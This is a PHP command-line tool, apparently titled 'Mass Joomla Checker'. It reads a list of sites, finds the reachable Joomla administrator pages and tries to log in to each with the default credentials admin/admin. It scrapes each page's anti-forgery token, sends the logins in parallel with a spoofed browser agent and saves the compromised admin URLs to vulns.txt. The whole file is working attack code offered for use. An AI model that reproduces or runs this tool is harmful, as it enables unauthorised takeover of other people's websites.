<?php

error_reporting(0);

function joo_bruteforcer($joo_sites) {

    $login = "admin";
    $password = "admin";

    $node_count = count($joo_sites);
    $curl_arr = array();
    $vulns = array();
    $master = curl_multi_init();


    for($i = 0; $i < $node_count; $i++)
    {
        $cookie = "cookie/cookie".$i.".txt";
        $url = $joo_sites[$i]."joomla/administrator/index.php";
        $curl_arr[$i] = curl_init();

        curl_setopt($curl_arr[$i], CURLOPT_URL, $url);
        curl_setopt($curl_arr[$i], CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)");
        curl_setopt($curl_arr[$i], CURLOPT_SSL_VERIFYHOST,false);
        curl_setopt($curl_arr[$i], CURLOPT_SSL_VERIFYPEER,false);
        curl_setopt($curl_arr[$i], CURLOPT_RETURNTRANSFER, TRUE );
        curl_setopt($curl_arr[$i], CURLOPT_FOLLOWLOCATION, TRUE);
        curl_setopt($curl_arr[$i], CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($curl_arr[$i], CURLOPT_COOKIEFILE, $cookie);
        curl_setopt($curl_arr[$i], CURLOPT_HEADER, false );

        curl_multi_add_handle($master, $curl_arr[$i]);
    }

    do {
        curl_multi_exec($master,$running);
    } while($running > 0);


    for($i = 0; $i < $node_count; $i++)
    {
        $results[] = curl_multi_getcontent  ( $curl_arr[$i]  );
        if (!preg_match('/name="([a-zA-z0-9]{32})"/', $results[$i], $spoof[$i])) {
            preg_match("/name='([a-zA-z0-9]{32})'/", $results[$i], $spoof[$i]);
        }

        $sitetoken[] = array($joo_sites[$i]=>$spoof[$i][1]);
    }

    for($i = 0; $i < $node_count; $i++)
    {
        curl_multi_remove_handle($master, $curl_arr[$i]);
    }

    for($i = 0; $i < $node_count; $i++)
    {
        $cookie = "cookie/cookie".$i.".txt";
        $url = $joo_sites[$i]."joomla/administrator/index.php";
        $postdata = "username=$login&passwd=$password&option=com_login&task=login&return=aW5kZXgucGhw&".$sitetoken[$i][$joo_sites[$i]]."=1";

        $curl_arr[$i] = curl_init();
        curl_setopt($curl_arr[$i], CURLOPT_URL, $url);
        curl_setopt($curl_arr[$i], CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)");
        curl_setopt($curl_arr[$i], CURLOPT_RETURNTRANSFER, TRUE );
        curl_setopt($curl_arr[$i], CURLOPT_SSL_VERIFYHOST,false);
        curl_setopt($curl_arr[$i], CURLOPT_SSL_VERIFYPEER,false);
        curl_setopt($curl_arr[$i], CURLOPT_FOLLOWLOCATION, TRUE);
        curl_setopt($curl_arr[$i], CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($curl_arr[$i], CURLOPT_COOKIEFILE, $cookie);
        curl_setopt( $curl_arr[$i], CURLOPT_POST, 1);
        curl_setopt( $curl_arr[$i], CURLOPT_POSTFIELDS, $postdata);


        curl_multi_add_handle($master, $curl_arr[$i]);
    }

    do {
        curl_multi_exec($master,$running);
    } while($running > 0);


    for($i = 0; $i < $node_count; $i++)
    {

          $results2[] = curl_multi_getcontent  ( $curl_arr[$i]  );
          $site[] = curl_getinfo  ( $curl_arr[$i]  );
          if(strpos($results2[$i], "Control Panel")) {
            $vulns[] = $site[$i]['url'];
          }
    }

    echo "[*] Vulns: ". count($vulns) . "\n";
    $counter = 0;

    if(count($vulns) != 0) {
        echo "[*] Saving results to vulns.txt\n";
        $fp = fopen('vulns.txt', 'a');
        while($counter < count($vulns)) {
          fwrite($fp, $vulns[$counter] ."\n");
          $counter++;
        }
    }

}


function joo_checker($urls) {

     $joo_sites = array();
     $nodes = array();
     $count = 0;

     while($count < count($urls)) {

       $link = trim(preg_replace('/\s\s+/', ' ', $urls[$count]));

       if($link != "/administrator/index.php") {
         $nodes[] = $link;
       }
       $count++;
     }

     $node_count = count($nodes);
     echo "\n[*] Loaded: " . $node_count."\n";

     $curl_arr = array();
     $master = curl_multi_init();

     for($i = 0; $i < $node_count; $i++)
     {
         $url = $nodes[$i];
         $curl_arr[$i] = curl_init();
         curl_setopt($curl_arr[$i], CURLOPT_URL, $url);
         curl_setopt($curl_arr[$i], CURLOPT_RETURNTRANSFER, true);
         curl_setopt($curl_arr[$i], CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)");
         curl_setopt($curl_arr[$i], CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($curl_arr[$i], CURLOPT_SSL_VERIFYHOST,false);
         curl_setopt($curl_arr[$i], CURLOPT_SSL_VERIFYPEER,false);
         curl_setopt($curl_arr[$i], CURLOPT_MAXREDIRS, 10);
         curl_setopt($curl_arr[$i], CURLOPT_CONNECTTIMEOUT, 3);
         curl_setopt($curl_arr[$i], CURLOPT_TIMEOUT, 20);
         curl_multi_add_handle($master, $curl_arr[$i]);
     }

     do {
         curl_multi_exec($master,$running);
     } while($running > 0);


     for($i = 0; $i < $node_count; $i++)
     {
         $results[] = curl_getinfo  ( $curl_arr[$i]  );
         $code = $results[$i]["http_code"];

         if($code == "200") {
           $joo_sites[] = $results[$i]['url'];
         }
     }

     $len = count($joo_sites);
     echo "[*] Joo_Sites: ". $len . "\n";
     return $joo_sites;
}


function load_urls() {

  $file = fopen("sites.txt", "r");
  $urls = array();

  while (!feof($file)) {
     $urls[] = fgets($file);
  }
  fclose($file);
  return $urls;
}



function banner() {

  echo "  _   _                 ____                       _ _           \n";
  echo " | | | | ___  __ _ _ __/ ___|  ___  ___ _   _ _ __(_) |_ _   _   \n";
  echo " | |_| |/ _ \/ _` | '__\___ \ / _ \/ __| | | | '__| | __| | | |  \n";
  echo " |  _  |  __/ (_| | |   ___) |  __/ (__| |_| | |  | | |_| |_| |  \n";
  echo " |_| |_|\___|\__,_|_|  |____/ \___|\___|\__,_|_|  |_|\__|\__, |  \n";
  echo "                                                         |___/   ";

    echo "\n-------------------------\n";
    echo "   Author: HearSecurity  \n";
    echo "----------------------------------\n";
    echo "   Tool: Mass Joomla Checker   \n";
    echo "----------------------------------\n";
    echo "   Usage: joo-login.php check      \n";
    echo "-----------------------------------\n\n";
}



if(($argv[1] == "check")) {

    $urls = load_urls();
    $joo_sites = joo_checker($urls);
    joo_bruteforcer($joo_sites);

}else{
    banner();
}

?>
